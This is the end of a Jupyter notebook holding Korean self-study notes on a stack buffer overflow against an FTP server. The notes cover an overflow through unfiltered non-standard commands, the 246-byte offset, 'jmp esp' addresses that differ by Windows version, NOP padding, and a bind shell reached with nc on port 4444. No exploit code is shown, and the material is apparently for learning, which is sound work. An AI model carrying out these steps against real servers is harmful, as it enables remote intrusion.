      "#### Shellcode \uc2e4\uc81c \ub3d9\uc791 \uacfc\uc815 \ub514\ubc84\uae45\n",
      "\n",
      "1. PWND, PWAD, RETA \uac19\uc774 FTP\uc5d0 \uc5c6\ub294 \uba85\ub839\uc5b4\ub97c \ub123\ub294\ub2e4. \uba85\ub839\uc5b4\uc870\ucc28 \ud544\ud130\ub9c1\ud558\uc9c0 \uc54a\ub294\ub2e4\ub294 \uac83. \uadf8\ub9ac\uace0 4\ubc14\uc774\ud2b8\ub97c \ub9de\ucdb0\uc92c\uc73c\ub2c8 \uaf2d 4\ubc14\uc774\ud2b8\ub97c \ub123\ub294\ub2e4. RETR \uacfc \uac19\uc774 \uae30\uc874\uc5d0 \uc788\ub294 FTP \uba85\ub839\uc5b4\ub97c \uc0ac\uc6a9\ud558\uba74 \ub418\uc9c0 \uc54a\ub294\ub2e4. \uc608\uc0c1 \ub85c\uc9c1\uc740 RETR\uc740 \uc785\ub825\uac12 \uac80\uc99d\uc744 \ud558\ub294\ub370 FTP\uc5c6\ub294 \uba85\ub839\uc5b4\ub4e4\uc740 \ubaa8\ub450 \ud55c \uacf3\uc5d0\uc11c \ucc98\ub9ac\ub97c \ud558\uae30 \ub54c\ubb38\uc5d0 \uacf5\ud1b5\ub41c \ubb38\uc81c\uac19\ub2e4.\n",
      "2. overflow\uac00 \ub418\ub294\uc9c0 \uc5b4\ub5bb\uac8c \ucc3e\uc544\ub0b4\ub098? \uc774\ub7f0 \ub85c\uc9c1\uc774 \uc788\ub294\uac78 \uc54c\uc544\ubcf4\ub824\uba74 \uc5b4\ub5a4 \ubd84\uc11d \ubc29\ubc95\uc774 \uc788\ub294\uac00? \n",
      "  - \uc18c\uc2a4 \ucf54\ub4dc \uac80\uc0ac\n",
      "  - Fuzzing? \ud55c\uae00\uc5d0\uc11c \ucde8\uc57d\uc810 \ucc3e\uc544\ub0b4\ub4ef\uc774 \ubc14\uc774\ub108\ub9ac\ub97c \ubc14\uafd4\uc11c \uacc4\uc18d \uc2e4\ud589..?\n",
      "  - \n",
      "3. overflow\uac00 \ub418\ub294\ub370 246\uac1c\uc778\uc9c0 \uc5b4\ub5bb\uac8c \uc54c\uc544\ub0b4\ub098? \ud558\ub098\uc529 \uc99d\uac00\uc2dc\ud0a4\uba74\uc11c \ub514\ubc84\uac70 \ubd99\uc5ec\uc11c \ud655\uc778\uc744 \ud574\uc57c \ub418\ub098? \ub9cc\uc57d\uc5d0 \ub514\ubc84\uac70\ub97c \ubd99\uc778\ub2e4\uba74 \ub9ac\ud134\uac12\uc774 \ub36e\uc5b4\uc50c\uc6cc\uc9c0\ub294 \uc8fc\uc18c\ub97c \uc2a4\ud06c\ub9bd\ud2b8\ub85c \ucc3e\uc544\ub0bc \uc218 \uc5c6\ub098? Immunity debugger\ub97c \ub9ce\uc774 \uc548 \uc368\ubd10\uc11c \uc798\uc740 \ubaa8\ub974\uaca0\uc9c0\ub9cc \ubb54\uac00 \uc870\uac74\uc744 \uc918\uc11c EIP\uac00 \ubcc0\uc870\ub418\uba74 BP\ub97c \uac78 \uc218 \uc788\uac8c \ud560 \uc218 \uc788\uc744\uac83 \uac19\uc740\ub370?\n",
      "4. \uc2a4\ud0dd\uc744 \ubaa8\ub450 \ub36e\uc5b4\uc50c\uc6b4 \ub2e4\uc74c\uc5d0 ret\uc744 \ub123\ub294\ub2e4. \uadf8\ub7f0\ub370 \uc5ec\uae30\uc5d0\uc11c \uc65c jmp esp\ub97c \ucc3e\ub098? \ucc45\uc5d0\uc11c \uc708\ub3c4\uc6b0 \ubc84\uc804, \uc5b8\uc5b4, Service Pack \ub4f1\uc744 \uc801\uc9c0\uc54a\uc544 \uc0bd\uc9c8\uc744 \ub9ce\uc774\ud588\ub2e4. \uac01 \ubc84\uc804\ub9c8\ub2e4 jmp esp\uc758 \uc8fc\uc18c\uac00 \ubaa8\ub450 \ub2e4\ub978\uac83\uc744 \uc54c \uc218 \uc788\ub2e4. \uadf8\ub807\ub2e4\uba74 \ub3d9\uc801\uc73c\ub85c \ud568\uc218\ub97c \ub9cc\ub4e4\uc5b4\uc11c \ucc3e\uc544\ub0b4\uc57c \ud558\ub294\ub370, \uadf8\uac74 \uc544\uae4c \ubcf4\uc5ec\uc92c\ub358\ub300\ub85c dll, \ucc3e\uace0 \uc2f6\uc740 \uc5b4\uc148\ube14\ub9ac \uba85\ub839\uc5b4\ub97c \ub123\uc5b4\uc8fc\uba74 \ucc3e\uc544\uc900\ub2e4. XP\uc5d0\uc11c\ub294 dll\uc774 \ubaa8\ub450 \uace0\uc815\uc8fc\uc18c\uc774\uae30 \ub54c\ubb38\uc5d0 \uba87 \uac00\uc9c0 \ub9ac\uc2a4\ud2b8 \ub9cc\ub4e4\uc5b4\ub193\uace0 \ub300\uc785\ud574\uc11c \ucc3e\uc544\ub0b4\uba74 \ub41c\ub2e4.(\uc774\uac8c \ubc14\ub85c \ubaa8\ub798\uc2dc\uacc4\uac00 \ub728\ub294 \uc774\uc720\ub2e4. \uc11c\ubc84 \ubc84\uc804\uc744 \uc54c\uc544\uc57c \ud55c\ub2e4. \uc815\ubcf4 \uc218\uc9d1\uc744 \ud574\uc57c\ud55c\ub2e4.)\n",
      "5. jmp esp\ub97c \ucc3e\ub294 \uc774\uc720\ub294 \ud568\uc218\ub97c \ub4e4\uc5b4\uac04 \ud6c4\uc5d0 ret\uc744 \ub9cc\ub098\uba74 \ud568\uc218\uac00 \uc885\ub8cc\ub418\uace0 ret\uc744 \uac00\ub9ac\ud0a4\uace0 \uc788\ub358 esp\ub294 \ud568\uc218\uac00 \uc885\ub8cc\ub418\uba74\uc11c padding\uc744 \uc0bd\uc785\ud55c \ubd80\ubd84\uc73c\ub85c \ubcc0\uacbd\ub41c\ub2e4.\n",
      "6. \uc65c? \uc5ec\uae30\uc5d0 padding\uc744 \ub123\uc5c8\ub294\uac00? \uadf8\ub0e5 shellcode\ub85c \uac00\uba74 \uc548\ub418\ub098?\n",
      "7. padding\uc778 NOP\uc744 \uc9c0\ub098 shellcode\ub97c \ub9cc\ub0ac\ub2e4. \uc774\uc81c victim\uc5d0\uc11c tcp bind\uac00 \uc2e4\ud589\ub418\uc5b4 \uc6d0\uaca9\uc5d0\uc11c victim\uc73c\ub85c nc(port:4444)\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc811\uc18d\ud558\uba74 \ub41c\ub2e4.\n",
      "8. \uc65c shellcode\ub97c \uc0ac\uc6a9\ud558\ub098? \uba54\ubaa8\ub9ac\uc5d0 \ub85c\ub4dc\uc2dc\ud0a4\uae30 \uc704\ud574\uc11c\uc778\uac00?\n",
      "\n",
      "-----"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "## [About my IPython in github](https://github.com/re4lfl0w/ipython)"
     ]
    }
   ],
   "metadata": {}
  }
 ]
}